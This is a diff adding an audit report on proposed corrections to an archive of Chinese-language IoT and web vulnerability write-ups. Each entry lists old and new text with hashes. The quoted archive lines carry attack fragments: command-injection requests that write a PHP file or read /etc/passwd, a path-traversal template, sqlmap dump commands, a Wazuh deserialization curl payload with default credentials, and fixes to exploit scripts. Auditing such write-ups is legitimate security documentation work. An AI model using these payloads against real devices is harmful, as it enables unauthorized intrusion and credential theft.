@@ -1,0 +1,274 @@
+Scope: claim-specific subset of 5654 fixed inputs; 27 historical-correction notes, 1 explicit Aheng retraction checked against archive payload/code.
+
+IOT安全/其他设备/1day EasyCVR 智能边缘网关用户信息泄漏漏洞（附 POC）.md
+working_sha256=e467fd8fb9489e2f80a3108238a5fe283821904c2c7e5515b4f5d44b306b9ec8 archive_git_blob=2236b413dc96abf5ee5ffabc5c0cdf9973f7261b declaration_line=41
+old_text='\\{'
+new_text='{'
+archive_occurrences=[(102, '- "\\{\\{BaseURL\\}\\}/api/v1/userlist?pageindex=0&pagesize=10"')]
+old_text='\\}'
+new_text='}'
+archive_occurrences=[(102, '- "\\{\\{BaseURL\\}\\}/api/v1/userlist?pageindex=0&pagesize=10"')]
+old_text='veified: true'
+new_text='verified: true'
+archive_occurrences=[(97, 'veified: true')]
+old_text='Password字段为密码的MD5值，在线解密即可直接登陆后台'
+new_text='Password 字段被原文描述为 MD5 摘要；MD5 不能可逆解密，候选密码比对也不保证恢复明文。不要把真实摘要提交第三方在线服务；登录能力须单独验证'
+archive_occurrences=[(75, 'Password字段为密码的MD5值，在线解密即可直接登陆后台')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+Web安全/智能设备/迅饶自动化/上海迅饶自动化科技有限公司X2Modbus网关任意用户添加漏洞.md
+working_sha256=106039bdc5667eaa23fbe377ee320ee6e406ded044140f54d1d85af64ee0290c archive_git_blob=744017c44c2dc4514083949e3eedf6a3c241da72 declaration_line=39
+old_text='使用添加的账户`stc/stc`登录系统'
+new_text='请求设置的测试账户为 `stc/stc123456`；此处按 SQL 中的值统一，创建与登录成功仍需响应证据'
+archive_occurrences=[(38, '使用添加的账户`stc/stc`登录系统')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+Web安全/网络设备/RaspAP/（CVE-2020-24572）RaspAP 2.5 远程命令执行漏洞.md
+working_sha256=30cf25fc9e95995985d79b28d88d7633510325112746af21d8cacbe214528357 archive_git_blob=39a54c85f437ed7f1703ebe347536cc487a4ca6f declaration_line=38
+old_text='`include/webconsole.php`'
+new_text='`includes/webconsole.php`'
+archive_occurrences=[(12, '2.5的`include/webconsole.php`中发现了一个问题。借助经过身份验证的访问，攻击者可以使用配置错误（并且实际上不受限制）的Web控制台攻击运行该软件的底层OS（Raspberry')]
+old_text='#/usr/bin/python3'
+new_text='#!/usr/bin/python3'
+archive_occurrences=[(29, '#/usr/bin/python3')]
+old_text='listener_port = sys.argv[4]'
+new_text='listener_port = int(sys.argv[4])'
+archive_occurrences=[(61, 'listener_port = sys.argv[4]')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+Web安全/网络设备/百卓/百卓SmartSQL命令注入漏洞.md
+working_sha256=b5dba59a2fac14b9042cbc89fbe825296f5d5ffa6a75cdaf9c25a990426238cd archive_git_blob=e7af7d92aecdd44fe234f51ba81b36a048266701 declaration_line=38
+old_text='Content-Length: 0'
+new_text='Content-Length: 12'
+archive_occurrences=[(44, 'Content-Length: 0')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+Web安全/安全设备/金山终端安全系统/奇安信攻防社区 - 金山终端安全系统 V8-V9 存在文件上传漏洞.md
+working_sha256=2a9f3e5dd520c209ca30f7549b98a579da8b9aea46bff6ab4ac81c5b0d6c76cb archive_git_blob=2cc8ae51e68fba51aee3ffbbac9e8ad94af87d49 declaration_line=39
+old_text='preg_math'
+new_text='preg_match'
+archive_occurrences=[(55, '在第 27 行中，使用 preg_math 进行一次正则匹配。要求上传的文件名必须已 / A-z/*32 位字符的格式。')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+Web安全/网络设备/天融信/天融信-TopApp-LB-enable_tool_debug.php-远程命令执行漏洞.md
+working_sha256=c3f7b5b86116e7b3ca29b2a82f69ce39d703446729e7f9bba0145fab8626257a archive_git_blob=5e2aadb6bdd38e69a980bd236807c3dd94c94801 declaration_line=39
+old_text='这里设置 var=0'
+new_text='这里设置 val=0'
+archive_occurrences=[(84, '这里设置 var=0，tool=1，再进行命令拼接造成远程命令执行')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+IOT安全/其他设备/WLAN-AP-WEA453e RCE三星路由器远程命令执行漏洞.md
+working_sha256=db878fc911e070444b07a2297f875315ec7b1db66de381b85b805f4fd2567eca archive_git_blob=8c332003e5a3dde0a3978aadafc5595b9b755ab5 declaration_line=39
+old_text='exp(192.168.10.1,80)'
+new_text='exp("192.168.10.1", 80)'
+archive_occurrences=[(156, 'exp(192.168.10.1,80)')]
+old_text='self.target=target'
+new_text='self.target = "http://{}:{}/".format(target, port)'
+archive_occurrences=[(143, 'self.target=target')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+IOT安全/海康威视/海康威视SPONIP网络对讲广播系统getjson存在任意文件读取漏洞.md
+working_sha256=22a0634856224b9d15e362addf735e91b9865743f078ad3fda4879a4510d0fcb archive_git_blob=a05b85c071fc85d255a0a70450e92aa37daf940c declaration_line=39
+old_text='Content-Length: 44'
+new_text='Content-Length: 29'
+archive_occurrences=[(30, 'Content-Length: 44')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+IOT安全/Amazon/（CVE-2018-11020）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞.md
+working_sha256=26fd0a2030cfd8a7f13b221fd982e3688796fd9351b43da6d3b941049ed27cdb archive_git_blob=d443c386b24e74312a7c76cb68d5a59326a9aa07 declaration_line=39
+old_text='#include &lt;stdio.h&gt;'
+new_text='#include &lt;stdio.h&gt; / #include &lt;stdlib.h&gt; / #include &lt;unistd.h&gt;'
+archive_occurrences=[]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+IOT安全/Amazon/（CVE-2018-11025）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞.md
+working_sha256=dc7f62d3d19c6e516b88271f488d069becac00a567c10c7b194cee53c45ac5f0 archive_git_blob=e8dd0b6f78025e69f5c3ace08f937deca8b835da declaration_line=41
+old_text='#include &lt;stdio.h&gt;'
+new_text='#include &lt;stdio.h&gt; / #include &lt;stdlib.h&gt; / #include &lt;unistd.h&gt;'
+archive_occurrences=[]
+old_text='payload NULL'
+new_text='payload 指向 gpadc 请求结构体'
+archive_occurrences=[(58, 'printf("Try ioctl device file \'%s\', with command 0x%x and payload NULL\\n", driver, command);')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+IOT安全/Ruijie/锐捷-NBR-1300G路由器-越权CLI命令执行漏洞.md
+working_sha256=5a165de88e935fd0389ee0be7b1cceb4df547774f9850776c2c34db602be3681 archive_git_blob=c7feff5630a91cfea79210c77fcea3104a417a4c declaration_line=40
+old_text='show%webmaster%user'
+new_text='show%20webmaster%20user'
+archive_occurrences=[(54, 'command=show%webmaster%user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+Web安全/网络设备/F5 BIG-IP/F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902.md
+working_sha256=48a1fcbf6f95bbe24e2aab5ad2af3f94992a57d9d3cffb614e67918659f72354 archive_git_blob=1e529ac50eb73bdceb4d368161910312bfe77a9b declaration_line=41
+old_text='读取文件 /tmp/test / '
+new_text='读取文件 /tmp/test.txt / '
+archive_occurrences=[]
+old_text='未对`command` 参数进行处理，直接调用'
+new_text='所示源码含命令字符、操作和模块白名单校验；需结合认证绕过及具体构建判断可达性，不能描述为完全无校验。原文后续调用描述为'
+archive_occurrences=[(37, '在 `tmshCmd` 的 `service`方法处理请求的时候，未对`command` 参数进行处理，直接调用 `WorkspaceUtils.runTmshCommand(cmd, request);` 方法执行命令，限制了执行`delete,create,list,modify`。')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+Web安全/网络设备/Palo Alto/CVE-2024-9465：Palo Alto Expedition 未经身份验证的 SQL 注入 POC.md
+working_sha256=a8ced19772b05838d12e3e105ec1339bc432e8216267944d98603920056f371c archive_git_blob=fe804120fcb279c50dfa028dc152500f0390fa69 declaration_line=39
+old_text='action=im port'
+new_text='action=import'
+archive_occurrences=[(164, 'python3 sqlmap.py -u "https://10.0.40.64/bin/configurations/parsers/Checkpoint/CHECKPOINT.php?action=im port&type=test&project=pandbRBAC&signatureid=1" -p signatureid -T users --dump'), (184, 'python3 sqlmap.py -u "https://<ip_address>/bin/configurations/parsers/Checkpoint/CHECKPOINT.php?action=im port&type=test&project=pandbRBAC&signatureid=1" -p signatureid -T users --dump')]
+old_text='action=import&amp;type=test&amp;project=pandb&amp;signatureid=1 OR 1=1'
+new_text='action=import&amp;type=test&amp;project=pandbRBAC&amp;signatureid=1 OR 1=1'
+archive_occurrences=[]
+old_text='该漏洞被指定为 CVE-2024-9466。我们的概念验证可以在这里找到。'
+new_text='此处描述的是 CronJobs 命令注入，与后文明文日志泄露的 CVE-2024-9466 不同；本段编号映射待核，不能把两者合为同一漏洞'
+archive_occurrences=[(99, '该漏洞被指定为 CVE-2024-9466。我们的概念验证可以在这里找到。')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+IOT安全/Amazon/（CVE-2018-11023）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞.md
+working_sha256=9714a97ffc855b9cd72bb8460de1efbff3b962e61fcee98006dfdb81534f1cbc archive_git_blob=da07bf7034f06ce08544f6adae47c00b68189c55 declaration_line=40
+old_text='#include &lt;stdio.h&gt;'
+new_text='#include &lt;stdio.h&gt; / #include &lt;stdlib.h&gt; / #include &lt;unistd.h&gt;'
+archive_occurrences=[]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+IOT安全/安恒明御/漏洞复现 安恒明御安全网关 aaa portal auth config reset 远程命令执行漏洞.md
+working_sha256=19b80305e98eb96a7a8c0b54e656e0a02d1f98d19aea3cbe529dd70c98ead91d archive_git_blob=e86aa28447f6499b3f203c7809b083c1fbfc9660 declaration_line=41
+old_text='http://x.x.x.x/astdfkhl.php'
+new_text='http://x.x.x.x/txzfsrur.php'
+archive_occurrences=[(78, 'http://x.x.x.x/astdfkhl.php')]
+old_text='\\{'
+new_text='{'
+archive_occurrences=[(106, 'file_name: "\\{\\{to_lower(rand_text_alpha(8))\\}\\}"'), (107, 'file_content: "\\{\\{to_lower(rand_text_alpha(30))\\}\\}"'), (111, 'GET /webui/?g=aaa_portal_auth_config_reset&type=%0aecho%20%27%3C%3Fphp%20echo%20%22\\{\\{file_content\\}\\}%22%3B%20phpinfo%28%29%3B%20%3F%3E%27%20%3E%3E%20%2Fusr%2Flocal%2Fwebui%2F\\{\\{file_name\\}\\}.php%0a HTTP/1.1')]
+old_text='\\}'
+new_text='}'
+archive_occurrences=[(106, 'file_name: "\\{\\{to_lower(rand_text_alpha(8))\\}\\}"'), (107, 'file_content: "\\{\\{to_lower(rand_text_alpha(30))\\}\\}"'), (111, 'GET /webui/?g=aaa_portal_auth_config_reset&type=%0aecho%20%27%3C%3Fphp%20echo%20%22\\{\\{file_content\\}\\}%22%3B%20phpinfo%28%29%3B%20%3F%3E%27%20%3E%3E%20%2Fusr%2Flocal%2Fwebui%2F\\{\\{file_name\\}\\}.php%0a HTTP/1.1')]
+old_text='max-request: 1'
+new_text='max-request: 2'
+archive_occurrences=[(102, 'max-request: 1')]
+Assessment: note is internally consistent; archive request writes txzfsrur.php while following readback requests astdfkhl.php; Nuclei content visibly has escaped braces and max-request: 1. Restoration note says historical fixes were not applied.
+
+Web安全/智能设备/车载定位终端/卡车卫星定位系统存在密码重置漏洞.md
+working_sha256=895aa1b069e8ec8a86ab99191dc4d11b669ceee0b4ae32516dbd03c892242f46 archive_git_blob=e3d37086882324611995f3f4865d054c43813676 declaration_line=40
+old_text='使用`admin/test123456`成功登录系统'
+new_text='请求中的测试凭据为 `admin/test12345`；原文结论多写了一位 6，此处按请求统一，实际登录结果仍待补响应证据'
+archive_occurrences=[(53, '使用`admin/test123456`成功登录系统')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+Web安全/网络设备/Palo Alto/Palo Alto Networks PAN-OS 命令注入漏洞分析（CVE-2024-3400）.md
+working_sha256=bb1ee50b89d38d45bb5de22349cccfa894ff544ce4f9c0aa252fe4118cc1ed3f archive_git_blob=9bf075a29b145e9a062e2e0b23ccb1e84e480418 declaration_line=42
+old_text='curl https://hostname/global-protect/login.esp-k-H“Cookie:SESSSID=test_data”'
+new_text="curl https://hostname/global-protect/login.esp -k -H 'Cookie: SESSID=test_data'"
+archive_occurrences=[(91, 'curl https://hostname/global-protect/login.esp-k-H“Cookie:SESSSID=test_data”')]
+old_text='device_termetry'
+new_text='device_telemetry'
+archive_occurrences=[(126, '脚本 / usr/local/bin/dt_send 将在 / opt/panlogs/tmp/device_termetry/hour 和和 / opt/panlog/tmp/device_temetry/day 目录中读取新文件，然后通过 / usr/local/biin/dt_cURL** 脚本每小时将文件名包括在 cURL 请求中。')]
+old_text='device_temetry'
+new_text='device_telemetry'
+archive_occurrences=[(126, '脚本 / usr/local/bin/dt_send 将在 / opt/panlogs/tmp/device_termetry/hour 和和 / opt/panlog/tmp/device_temetry/day 目录中读取新文件，然后通过 / usr/local/biin/dt_cURL** 脚本每小时将文件名包括在 cURL 请求中。')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+IOT安全/华硕/Asus 路由器栈溢出漏洞分析.md
+working_sha256=c50a85828029c77b45427195a426ff08a3b35fa9934c8d4f814b47e0c80ba594 archive_git_blob=d26d0512c88f3e53cb07c940171110399b932aca declaration_line=41
+old_text='也就是4840* a'
+new_text='也就是4780* a'
+archive_occurrences=[(107, '1.  第一次尝试填充4740 * a,查看栈中数据，还有40个字节需要填充，也就是4840* a + p32(addr)')]
+old_text="tm_month == 'Apr '"
+new_text="tm_month == 'Apr'"
+archive_occurrences=[(204, "if tm_month == 'Apr ':")]
+old_text="tm_month == 'Sept'"
+new_text="tm_month == 'Sep'"
+archive_occurrences=[(214, "if tm_month == 'Sept':")]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+Web安全/智能设备/大华智慧园区前台/大华智慧园区前台任意文件上传（最新 1day）.md
+working_sha256=fdd166544961643ca76a0209a906eea054037e75c08edb8e79cc7d611b6c6ce2 archive_git_blob=6c6095a254bd759833b2b6e6786db94c71a0f77a declaration_line=40
+old_text='访问 / url/kaisa.jsp'
+new_text='访问 / url/kaisec.jsp'
+archive_occurrences=[(73, '**访问 / url/kaisa.jsp：**')]
+old_text='当访问接口时出现如下响应体时，基本可认定该漏洞存在。'
+new_text='出现所示响应仅支持接口可达，不能单独确认越界上传或脚本执行；还需上传响应、保存路径与受控回读证据。'
+archive_occurrences=[(30, '**/emap/webservice/gis/soap/poi 接口，当访问接口时出现如下响应体时，基本可认定该漏洞存在。**')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+Web安全/网络设备/F5 BIG-IP/F5 BIG-IP 远程代码执行漏洞(CVE-2023-46747).md
+working_sha256=f9e09c17963cf73beab8c60ca49a300c98965bc754f8deeec7c69dc456e5fe28 archive_git_blob=bfa1b557310c5f3487ec3d106f5a7147d9d24236 declaration_line=43
+old_text='{"username":"admin", "password":"admin789456"}'
+new_text='{"username":"adminqq", "password":"admin789456"}'
+archive_occurrences=[(80, '{"username":"admin", "password":"admin789456"}')]
+old_text='Content-Type: application/x-www-form-urlencoded /  /  {"username"'
+new_text='Content-Type: application/json /  /  {"username"'
+archive_occurrences=[]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+IOT安全/360/360 Phone N6 Pro内核漏洞.md
+working_sha256=b7ef4c1baf677e66a394aaa1b0edbf92a06d4b5cedd4207711b1756edc47c7fd archive_git_blob=c80d36b2d1b99943422ab46faa837cf565988467 declaration_line=39
+old_text='#include &lt;stdio.h&gt;'
+new_text='#include &lt;stdio.h&gt; / #include &lt;stdlib.h&gt; / #include &lt;unistd.h&gt;'
+archive_occurrences=[]
+old_text='with errno %dn'
+new_text='with errno %d\\n'
+archive_occurrences=[(44, 'printf("Failed to open %s, with errno %dn", driver, errno);')]
+old_text='payload NULLn'
+new_text='payload NULL\\n'
+archive_occurrences=[(49, 'printf("Try ioctl device file \'%s\', with command 0x%x and payload NULLn", driver, command);')]
+old_text='crash and reboot.n'
+new_text='crash and reboot.\\n'
+archive_occurrences=[(50, 'printf("System will crash and reboot.n");')]
+old_text='failed, %dn'
+new_text='failed, %d\\n'
+archive_occurrences=[(52, 'printf("Allocation of structs failed, %dn", errno);')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+IOT安全/Amazon/（CVE-2018-11021）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞.md
+working_sha256=d280fa65c5baa5471f18a61bb8a8cc49211e2a0e78fb8a6313b45ec073c52d99 archive_git_blob=2578890b50381c0700d4f2b595c091b1f2e54f93 declaration_line=40
+old_text='#include &lt;stdio.h&gt;'
+new_text='#include &lt;stdio.h&gt; / #include &lt;stdlib.h&gt; / #include &lt;unistd.h&gt;'
+archive_occurrences=[]
+old_text='To be added here'
+new_text='原文未提供崩溃日志，不能据此声称已有匹配日志'
+archive_occurrences=[(237, 'To be added here.')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+IOT安全/Ruijie/锐捷-EG易网关-branch_passw.php-远程命令执行.md
+working_sha256=c76ca637356f37533125e02e8f1577c392aa56e257ebb6a1ba8f9fcdde7744bd archive_git_blob=84aa40beed3c392179bff9e50fa90f416a3ceaba declaration_line=40
+old_text='/etc/psswd'
+new_text='/etc/passwd'
+archive_occurrences=[(144, 'pass=|cat /etc/psswd>../test_test.txt')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+Web安全/安全设备/Wazuh/CVE-2025-24016漏洞对Wazuh平台的潜在威胁.md
+working_sha256=cf7bb7f04fb045f7610806d7d022bad44dc2b5b86aee7dd20c438b9ce7ad8aed archive_git_blob=1bd8ee8e6220655188b1409cb332fc6f101157d8 declaration_line=40
+old_text='从4.4.0版本和4.9.1版本开始，一个不安全的反序列化漏洞'
+new_text='按本文范围表，4.4.0 至 4.9.0 为所述受影响范围，4.9.1 为修复边界；一个不安全的反序列化漏洞'
+archive_occurrences=[(38, "Wazuh是一个免费的开源平台，用于威胁预防、检测和响应。从4.4.0版本和4.9.1版本开始，一个不安全的反序列化漏洞允许在Wazuh服务器上远程执行代码。DistributedAPI参数序列化为JSON，并使用'as_wazuh_object'进行反序列化。如果攻击者设法在DAPI请求/响应中注入未经清理的字典，他们可以伪造未经处理的异常（'__unhandled_exc__'）来评估任意python代码。该漏洞可以由任何具有API访问权限的人（受损的仪表板或集群中的Wazuh服务器）触发，或者在某些配置中，甚至由受损的代理触发。山石网科应急响应中心提醒Wazuh用户尽快采取安全措施阻止漏洞攻击。")]
+old_text='run_as。'
+new_text='run_as'
+archive_occurrences=[(70, 'curl -X POST -k -u "wazuh-wui:MyS3cr37P450r.*-" -H "Content-Type: application/json" --data \'{"__unhandled_exc__":{"__class__": "exit", "__args__": []}}\' https://<worker-server>:55000/security/user/authenticate/run_as。')]
+old_text='绕过SSL证书验证(-k参数)'
+new_text='在客户端跳过服务器 TLS 证书校验（-k 参数，不是绕过服务端身份认证）'
+archive_occurrences=[(75, '攻击者向https://:55000/security/user/authenticate/run_as发送伪造身份认证的POST请求，绕过SSL证书验证(-k参数)，使用默认凭证(如wazuh-wui账户)通过基础认证(-u参数)，通过构造特殊的JSON数据{"unhandled_exc":...}触发API接口的反序列化漏洞，使服务器错误解析为系统级exit命令，最终导致主服务进程强制终止。')]
+old_text='系统级exit命令，最终导致主服务进程强制终止'
+new_text='Python exit 调用，可能导致处理进程退出；它不是系统 shell 命令，也不单独证明整个系统关闭'
+archive_occurrences=[(75, '攻击者向https://:55000/security/user/authenticate/run_as发送伪造身份认证的POST请求，绕过SSL证书验证(-k参数)，使用默认凭证(如wazuh-wui账户)通过基础认证(-u参数)，通过构造特殊的JSON数据{"unhandled_exc":...}触发API接口的反序列化漏洞，使服务器错误解析为系统级exit命令，最终导致主服务进程强制终止。')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+Web安全/网络设备/Juniper/（CVE-2023-36845）Juniper SRX 防火墙和 EX 交换机远程代码执行漏洞（附 POC）.md
+working_sha256=f1a1d9d313a57029fdbbe7678908390de425ba75f1ee5accd7572034f46783f8 archive_git_blob=1f3debbec202ce993a064b72c1c4d9ca0a80d49a declaration_line=41
+old_text='auto_propend_file'
+new_text='auto_prepend_file'
+archive_occurrences=[(41, '将 PHPRC 环境变量设置为 / dev/fd/0，将 allow_url_include 设置为 1，auto_propend_file 用 data 协议传入 PHP 代码')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+Web安全/智能设备/迅饶自动化/上海迅饶自动化科技有限公司X2Modbus网关GetUserList存在敏感信息泄露.md
+working_sha256=9ff89908677baadb65511c39d55abeaac627a1ee73b63a1a696965d64bf472ad archive_git_blob=837e32e4ea27c9c00534f2460692aa9e11059a5d declaration_line=39
+old_text='Content-Length: 56'
+new_text='Content-Length: 6'
+archive_occurrences=[(30, 'Content-Length: 56')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
+
+Web安全/网络设备/迪普/1day 迪普 VPN Service 任意文件读取漏洞复现（附 nuclei poc）.md
+working_sha256=f480f99ac6ad1eef521c86fd604fc70fdc823ae8f0441a083503f01f68b41366 archive_git_blob=8b8a3f40659ea745391babf9d13abda2cdf5e01a declaration_line=40
+old_text='\\{'
+new_text='{'
+archive_occurrences=[(96, '- "\\{\\{BaseURL\\}\\}/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"')]
+old_text='\\}'
+new_text='}'
+archive_occurrences=[(96, '- "\\{\\{BaseURL\\}\\}/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"')]
+Assessment: explicitly labels edits as historical proposals and says originals remain; archive evidence used to check presence of old literals. Ambiguous technical proposed corrections are not treated as findings solely from this static source comparison.
